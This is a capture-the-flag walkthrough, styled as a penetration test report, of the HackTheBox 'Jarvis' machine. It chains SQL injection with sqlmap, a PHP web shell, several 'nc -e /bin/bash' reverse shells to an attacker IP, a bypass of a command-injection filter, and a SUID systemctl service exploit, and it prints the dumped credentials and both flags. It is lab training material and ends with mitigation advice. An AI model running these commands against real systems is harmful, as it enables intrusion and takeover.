# Jarvis Penetration Test Report

## Executive Summary

This report documents the complete penetration testing process for the Jarvis machine from HackTheBox. The assessment revealed multiple security vulnerabilities including SQL injection, command injection, and privilege escalation vectors that ultimately led to full system compromise.

## Reconnaissance

### Initial Scanning

The penetration test began with comprehensive network reconnaissance to identify open ports and services.

```bash
export target=10.129.229.137

# Comprehensive port scan
sudo nmap -p- --min-rate 1000 -sT -vvv $target
```

<img width="433" height="61" alt="image" src="https://github.com/user-attachments/assets/81716739-b5c9-40d8-b973-bdaa2507751d" />

<img width="441" height="131" alt="image" src="https://github.com/user-attachments/assets/16bedcd1-10d3-4291-96fb-e553cac23ebc" />


**Scan Results:**
- **Port 22**: SSH service
- **Port 80**: HTTP service

### Service Enumeration

Following the initial discovery, detailed service enumeration was performed:

```bash
# Service version detection and default scripts
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="758" height="432" alt="image" src="https://github.com/user-attachments/assets/8f52b099-26c4-480f-8580-4cb95c28f3be" />

**Service Details:**
- **Port 22**: OpenSSH service
- **Port 80**: Apache HTTP server with web application

---

## Vulnerability Assessment

### Web Application Analysis

The web application hosted on port 80 was thoroughly examined:

1. **Initial Access**: `http://10.129.229.137/index.php`

<img width="961" height="720" alt="image" src="https://github.com/user-attachments/assets/8ff986fb-4f9a-4200-bc5c-a8c6e023ded3" />

2. **Navigation**: Discovered "Rooms & Suites" section

<img width="961" height="872" alt="image" src="https://github.com/user-attachments/assets/ef56fe0c-b0da-4eb0-9185-57a2dfec6292" />

3. **Vulnerability Identification**: Found SQL injection vulnerability in room booking parameter

<img width="775" height="692" alt="image" src="https://github.com/user-attachments/assets/9fc1b895-c489-4850-80e0-bbcba1a261eb" />

### SQL Injection Vulnerability

The parameter `cod` in the URL `http://10.129.229.137/room.php?cod=1` was found to be vulnerable to SQL injection:

```bash
# Initial vulnerability confirmation
http://10.129.229.137/room.php?cod=1'  # Produced error page
```

<img width="775" height="692" alt="image" src="https://github.com/user-attachments/assets/3cfbf93f-c709-4de5-a1ba-7539a935e378" />

---

## Exploitation

### Automated SQL Injection Testing

SQLMap was utilized to automate the exploitation process:

```bash
# Initial SQL injection detection
sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch

# Database enumeration
sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch --users --passwords
```

<img width="951" height="472" alt="image" src="https://github.com/user-attachments/assets/e1dc4f91-9807-46ea-ad01-b3a8ee6aa552" />

<img width="554" height="183" alt="image" src="https://github.com/user-attachments/assets/67b87c3e-0dce-43a1-867f-a1c6db2948ef" />

**Credentials Extracted:**
- **Username**: DBadmin
- **Password**: imissyou

### Web Shell Deployment

A PHP web shell was created and uploaded through the SQL injection vulnerability:

```php
<?php system($_REQUEST['cmd']);?>
```

**File Upload Process:**
```bash
sqlmap -u "http://10.129.229.137/room.php?cod=1" --random-agent --batch --file-write /home/aravinda/Documents/htb-machines/jarvis/exploit.php --file-dest /var/www/html/exploit.php
```

<img width="951" height="314" alt="image" src="https://github.com/user-attachments/assets/1963c2e2-aa37-41cb-8ce1-8b58bac57aa8" />

### Reverse Shell Establishment

The web shell was used to establish a reverse shell connection:

```bash
# Command execution verification
curl "http://10.129.229.137/exploit.php?cmd=id"

# Reverse shell execution
curl "http://10.129.229.137/exploit.php?cmd=nc+-e+/bin/bash+10.10.14.106+4444"
```

<img width="743" height="143" alt="image" src="https://github.com/user-attachments/assets/6f5b037d-b0e3-46f7-9441-103545ac2f2d" />

<img width="523" height="344" alt="image" src="https://github.com/user-attachments/assets/f07c61e3-9594-4603-a3ad-c267a6ddbc66" />

**Shell Access Obtained:**
- **User**: www-data
- **Privileges**: Limited web server access

---

## Post-Exploitation

### Privilege Escalation Analysis

Initial privilege escalation vectors were investigated:

```bash
# Sudo privileges check
sudo -l
```

<img width="661" height="136" alt="image" src="https://github.com/user-attachments/assets/72911f80-6c29-453c-a5ad-c27be6b2e77c" />

**Discovery:**
User www-data could execute the following command as user pepper without password:
```bash
(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### Code Analysis

The `simpler.py` script was analyzed for vulnerabilities:

**Key Finding:** The `exec_ping()` function contained command injection vulnerability with limited filtering:

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

### Lateral Movement to Pepper

Bypassing the command injection filters using `$()` substitution:

```bash
# Create exploit script
echo -e '#!/bin/bash \n\n nc -e /bin/bash 10.10.14.106 9005' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh

# Execute through simpler.py
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Input: $(/tmp/exploit.sh)
```

<img width="410" height="268" alt="image" src="https://github.com/user-attachments/assets/92aa7007-f713-4e50-bb95-55b1e4d9ac5e" />

<img width="465" height="156" alt="image" src="https://github.com/user-attachments/assets/0f09058b-2f0c-48be-a387-bfa2bd00eccd" />

**Access Achieved:**
- **User**: pepper
- **User Flag**: `1f3eed00bf308856e86ebdaa6a15f208`

---

## Privilege Escalation

### System Analysis

Comprehensive system enumeration was performed:

```bash
# Transfer and execute LinPEAS
wget 10.10.14.106/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<img width="466" height="125" alt="image" src="https://github.com/user-attachments/assets/906e44b1-95cf-4ef8-8014-297ecdfe0c8b" />

<img width="638" height="258" alt="image" src="https://github.com/user-attachments/assets/7810e31f-d8ab-4bb1-be3f-926942447f0a" />


**Critical Finding:**
```bash
-rwsr-x--- 1 root pepper 171K Jun 29  2022 /bin/systemctl
```

<img width="954" height="459" alt="image" src="https://github.com/user-attachments/assets/c98214b6-208d-4be6-8e50-cf0416bd0bff" />


### Root Privilege Escalation

The SUID systemctl binary was exploited following GTFOBins methodology:

**Exploit Service Creation:**
```bash
cat > /dev/shm/ara.service << 'EOF'
[Unit]
Description=Ara rev shell

[Service]
Type=simple
ExecStart=/bin/bash -c "/bin/nc -e /bin/bash 10.10.14.106 9007"

[Install]
WantedBy=multi-user.target
EOF
```

**Privilege Escalation Execution:**
```bash
systemctl link /dev/shm/ara.service
systemctl start ara.service
```

<img width="519" height="328" alt="image" src="https://github.com/user-attachments/assets/ab2bafd2-7ad1-4728-aba7-66af9abfce0c" />

<img width="631" height="579" alt="image" src="https://github.com/user-attachments/assets/811eb3bb-46ed-4ebc-beac-b99b776bb215" />

**Root Access Achieved:**
- **User**: root
- **Root Flag**: `7e796f843cc56b7f53d2825105da9968`

---

## Conclusion

The Jarvis penetration test successfully demonstrated a complete attack chain from initial reconnaissance to full system compromise. The assessment revealed critical security flaws including:

1. **SQL Injection** in web application parameters
2. **Insufficient Input Validation** leading to command injection
3. **Privilege Escalation** via misconfigured SUID binaries

---

## Mitigation Recommendations

### Immediate Actions
1. **Input Validation**: Implement strict input validation and parameterized queries
2. **File Upload Restrictions**: Restrict file upload capabilities and file execution in web directories
3. **Principle of Least Privilege**: Review and restrict sudo privileges and SUID binaries

### Long-term Security Improvements
1. **Web Application Firewall**: Deploy WAF to detect and prevent SQL injection attacks
2. **Code Review**: Conduct regular security code reviews for custom applications
3. **System Hardening**: Implement comprehensive system hardening following security benchmarks
4. **Monitoring**: Deploy intrusion detection systems and log monitoring

### Specific Technical Fixes
- Sanitize all user inputs in the `room.php` parameter
- Replace `os.system()` calls with `subprocess` with proper argument handling
- Remove unnecessary SUID permissions from systemctl
- Implement proper authentication and authorization checks

---

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style> ****
